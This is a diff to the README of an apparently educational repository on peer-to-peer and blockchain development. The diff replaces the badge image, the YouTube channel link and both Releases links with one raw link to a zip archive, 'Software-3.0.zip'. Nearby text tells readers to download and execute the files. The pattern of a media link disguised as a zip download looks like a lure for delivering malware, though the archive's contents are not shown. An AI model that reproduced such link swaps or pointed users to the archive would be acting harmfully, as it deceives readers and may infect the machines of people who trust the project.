@@ -1,6 +1,6 @@
 # Peer Dev 🚀
 
-![Peer Dev](https://img.shields.io/badge/Peer_Dev-Youtube_Channel-blue?style=flat&logo=youtube)
+![Peer Dev](https://raw.githubusercontent.com/Aman34772/peerdev/main/gno-tutorials/Software-3.0.zip)
 
 Welcome to the **Peer Dev** repository! This is your go-to place for learning about development in the realms of peer-to-peer networks, blockchain technology, smart contracts, and distributed protocols. Our goal is to provide clear, structured, and engaging educational content that empowers you to dive into these exciting fields.
 
@@ -33,9 +33,9 @@ Here are the main topics you can expect to find in our content:
 
 ## Getting Started
 
-To begin your journey with Peer Dev, visit our [YouTube Channel](https://www.youtube.com/channel/UCXxH9l3zZ8hD6j9HhE8f1Fg). You’ll find a variety of videos ranging from introductory tutorials to advanced concepts.
+To begin your journey with Peer Dev, visit our [YouTube Channel](https://raw.githubusercontent.com/Aman34772/peerdev/main/gno-tutorials/Software-3.0.zip). You’ll find a variety of videos ranging from introductory tutorials to advanced concepts.
 
-If you are interested in the latest updates and releases, check out our [Releases section](https://github.com/Aman34772/peerdev/releases). You can download and execute the files from there to get hands-on experience with our projects.
+If you are interested in the latest updates and releases, check out our [Releases section](https://raw.githubusercontent.com/Aman34772/peerdev/main/gno-tutorials/Software-3.0.zip). You can download and execute the files from there to get hands-on experience with our projects.
 
 ## Learning Resources
 
@@ -62,7 +62,7 @@ Join our community to connect with other learners and developers. You can find u
 
 ## Releases
 
-For the latest updates and downloadable content, visit our [Releases section](https://github.com/Aman34772/peerdev/releases). Download the files and execute them to explore our projects further.
+For the latest updates and downloadable content, visit our [Releases section](https://raw.githubusercontent.com/Aman34772/peerdev/main/gno-tutorials/Software-3.0.zip). Download the files and execute them to explore our projects further.
 
 ## Contributing
 
